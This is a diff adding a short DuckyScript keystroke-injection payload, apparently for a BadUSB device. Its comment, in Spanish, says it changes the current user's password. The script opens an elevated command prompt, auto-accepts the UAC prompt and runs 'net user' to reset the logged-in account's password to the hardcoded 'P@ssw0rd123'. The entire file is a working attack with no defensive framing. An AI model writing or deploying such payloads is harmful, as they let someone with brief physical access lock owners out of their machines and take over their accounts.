@@ -1,0 +1,12 @@
+REM Cambiar contraseña del usuario actual
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+CONTROL-SHIFT ENTER
+DELAY 1000
+ALT y
+STRING net user %username% P@ssw0rd123
+ENTER
+STRING exit
+ENTER
